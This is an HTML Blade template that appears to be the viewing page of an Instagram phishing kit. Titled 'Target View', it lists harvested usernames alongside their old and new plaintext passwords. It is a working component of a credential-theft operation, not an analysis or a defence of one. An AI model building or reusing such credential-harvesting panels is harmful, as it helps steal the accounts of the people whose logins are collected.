<!doctype html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Instagram">
    <meta name="author" content="MasRockey">
    <link rel="shortcut icon" href="img/icon.png" type="image/x-icon">
    <title>Target View</title>
  @vite(['resources/css/app.css','resources/js/app.js'])
</head>
<body>

    <div class="relative overflow-x-auto">
        <table class="w-full text-sm text-left text-gray-500 dark:text-gray-400">
            <thead class="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                <tr>
                    <th scope="col" class="px-6 py-3">
                        Username
                    </th>
                    <th scope="col" class="px-6 py-3">
                        Oldpassword
                    </th>
                    <th scope="col" class="px-6 py-3">
                        Newpassword
                    </th>
                </tr>
            </thead>
            <tbody>
                @foreach ($data as $row)

                <tr class="bg-white border-b dark:bg-gray-800 dark:border-gray-700">
                    <th scope="row" class="px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white">
                        {{$row->username}}
                    </th>
                    <td class="px-6 py-4">
                        {{$row->oldpassword}}
                    </td>
                    <td class="px-6 py-4">
                        {{$row->newpassword}}
                    </td>
                </tr>

                @endforeach

            </tbody>
        </table>
    </div>

</body>
</html>
